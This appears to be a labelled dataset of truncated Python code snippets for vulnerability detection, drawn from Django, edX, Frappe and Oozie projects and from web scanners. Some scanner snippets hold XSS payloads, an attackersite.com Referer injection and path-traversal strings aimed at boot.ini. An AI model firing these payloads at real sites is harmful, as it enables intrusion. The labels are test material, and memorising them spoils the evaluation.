url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views", "label": 0}, {"snippet_id": 14344, "code": " url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 44211, "code": " desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import", "label": 0}, {"snippet_id": 20566, "code": "-pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ", "label": 0}, {"snippet_id": 45044, "code": " HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return", "label": 0}, {"snippet_id": 27784, "code": " traceback.format_exc(), 'status': status, 'type': exception.__class__.__name__ } if isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self", "label": 0}, {"snippet_id": 1831, "code": ",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=", "label": 0}, {"snippet_id": 7110, "code": ", url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django", "label": 0}, {"snippet_id": 13329, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 53459, "code": "=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators'", "label": 0}, {"snippet_id": 28028, "code": "(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except", "label": 0}, {"snippet_id": 14415, "code": "?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload')", "label": 0}, {"snippet_id": 1440, "code": " def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan", "label": 0}, {"snippet_id": 1943, "code": ".insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid}", "label": 0}, {"snippet_id": 53094, "code": "'coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc", "label": 0}, {"snippet_id": 24083, "code": " and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 45902, "code": ".urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop.models", "label": 0}, {"snippet_id": 2671, "code": " payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request", "label": 0}, {"snippet_id": 30685, "code": "\tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form.getvalue('servaction'", "label": 0}, {"snippet_id": 15768, "code": "\"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), ", "label": 0}, {"snippet_id": 43778, "code": " None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data`", "label": 0}, {"snippet_id": 40505, "code": "[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\"", "label": 0}, {"snippet_id": 33434, "code": "))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in", "label": 1}, {"snippet_id": 49517, "code": "] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field=self.model_field.rel if hasattr(self.model_field", "label": 0}, {"snippet_id": 44167, "code": "\n import json import logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import", "label": 0}, {"snippet_id": 39358, "code": ".values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t", "label": 0}, {"snippet_id": 35689, "code": "\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)", "label": 0}, {"snippet_id": 38957, "code": " value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn", "label": 0}, {"snippet_id": 18908, "code": ", 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid", "label": 0}, {"snippet_id": 3887, "code": "=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\":", "label": 0}, {"snippet_id": 48690, "code": " +str(r.id)) return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article from the reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user", "label": 0}, {"snippet_id": 40962, "code": "(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/", "label": 0}, {"snippet_id": 31469, "code": "=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid", "label": 0}, {"snippet_id": 2647, "code": ".W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\":", "label": 0}, {"snippet_id": 34683, "code": "\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent", "label": 0}, {"snippet_id": 19926, "code": " self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False", "label": 0}, {"snippet_id": 26981, "code": "\\n\" % str(post_params) return return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(", "label": 0}, {"snippet_id": 12858, "code": "=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 38745, "code": "\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self", "label": 0}, {"snippet_id": 46319, "code": "\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column", "label": 0}, {"snippet_id": 51526, "code": ".AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard", "label": 0}, {"snippet_id": 3367, "code": "\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', ", "label": 0}, {"snippet_id": 9640, "code": "[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 7683, "code": "'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 12260, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name", "label": 1}, {"snippet_id": 50337, "code": "\"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self,", "label": 0}, {"snippet_id": 16382, "code": "'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r", "label": 0}, {"snippet_id": 42906, "code": "'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 50074, "code": ".last_alive={} self.keep_alive=None def _responseFailed(self, failure, csessid, request): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self):", "label": 0}, {"snippet_id": 15128, "code": " sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils", "label": 0}, {"snippet_id": 18562, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(", "label": 0}, {"snippet_id": 5586, "code": ",PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert(", "label": 0}, {"snippet_id": 30879, "code": ") \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var", "label": 0}, {"snippet_id": 8861, "code": " in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"", "label": 0}, {"snippet_id": 9583, "code": "='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware", "label": 0}, {"snippet_id": 15817, "code": " environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if", "label": 0}, {"snippet_id": 26684, "code": " '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 21895, "code": "', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name=", "label": 0}, {"snippet_id": 25051, "code": " self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format", "label": 0}, {"snippet_id": 23105, "code": ".student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'", "label": 0}, {"snippet_id": 6448, "code": "') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property def userdb_mongo_database", "label": 0}, {"snippet_id": 24263, "code": " import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize", "label": 0}, {"snippet_id": 2371, "code": " GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers", "label": 0}, {"snippet_id": 55059, "code": "\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity", "label": 1}, {"snippet_id": 33540, "code": " self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif", "label": 0}, {"snippet_id": 52140, "code": "']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id':", "label": 1}, {"snippet_id": 3194, "code": ": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=", "label": 0}, {"snippet_id": 2606, "code": " temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header)", "label": 0}, {"snippet_id": 2227, "code": "\"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param", "label": 0}, {"snippet_id": 7499, "code": "(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$", "label": 0}, {"snippet_id": 54812, "code": "'content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return", "label": 0}, {"snippet_id": 16797, "code": "'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 905, "code": ", '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==", "label": 0}, {"snippet_id": 8908, "code": " wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'", "label": 0}, {"snippet_id": 10313, "code": " num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit,", "label": 0}, {"snippet_id": 3414, "code": " is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid", "label": 0}, {"snippet_id": 36875, "code": "=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger", "label": 0}, {"snippet_id": 15547, "code": " \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If ", "label": 0}, {"snippet_id": 36000, "code": " \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get", "label": 0}, {"snippet_id": 25126, "code": "} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls)", "label": 0}, {"snippet_id": 50323, "code": ".start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. ", "label": 0}, {"snippet_id": 8684, "code": "?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware", "label": 0}, {"snippet_id": 54619, "code": "('-time') for i in queryset: i.md=markdown(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView", "label": 1}, {"snippet_id": 43879, "code": "][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self", "label": 0}, {"snippet_id": 13308, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 18327, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 32900, "code": "(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip(", "label": 1}, {"snippet_id": 5234, "code": " event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s", "label": 0}, {"snippet_id": 42884, "code": "') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True", "label": 0}, {"snippet_id": 9441, "code": ">[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 17507, "code": "'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 27746, "code": "._add_security_response_headers() self.response.headers['Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response", "label": 0}, {"snippet_id": 18316, "code": "<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name", "label": 1}, {"snippet_id": 54206, "code": "\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=", "label": 0}, {"snippet_id": 2270, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0", "label": 0}, {"snippet_id": 5320, "code": "', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', ", "label": 0}, {"snippet_id": 32766, "code": " start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%", "label": 0}, {"snippet_id": 51436, "code": "] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions", "label": 0}, {"snippet_id": 1401, "code": "['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data", "label": 0}, {"snippet_id": 44334, "code": "(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json", "label": 1}, {"snippet_id": 5941, "code": "></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload", "label": 0}, {"snippet_id": 52676, "code": "(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e:", "label": 0}, {"snippet_id": 15976, "code": "(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self", "label": 0}, {"snippet_id": 20198, "code": " if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data", "label": 0}, {"snippet_id": 43469, "code": ".meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password", "label": 0}, {"snippet_id": 22023, "code": " +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=(", "label": 0}, {"snippet_id": 13488, "code": "(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 34841, "code": " is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t", "label": 0}, {"snippet_id": 46841, "code": " return await super().save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content", "label": 1}, {"snippet_id": 3923, "code": " host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value", "label": 1}, {"snippet_id": 10152, "code": " self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec)", "label": 0}, {"snippet_id": 17823, "code": "', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 20492, "code": " test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O", "label": 0}, {"snippet_id": 18966, "code": "(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/", "label": 0}, {"snippet_id": 50194, "code": "(csessid) if request: request.write(jsonify(data)) request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid", "label": 0}, {"snippet_id": 32345, "code": "'Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin", "label": 0}, {"snippet_id": 45702, "code": " !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id", "label": 0}, {"snippet_id": 42338, "code": "\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", ", "label": 0}, {"snippet_id": 7919, "code": "', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action", "label": 0}, {"snippet_id": 14206, "code": "\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location", "label": 0}, {"snippet_id": 20242, "code": "=self.default_store, ) ) def 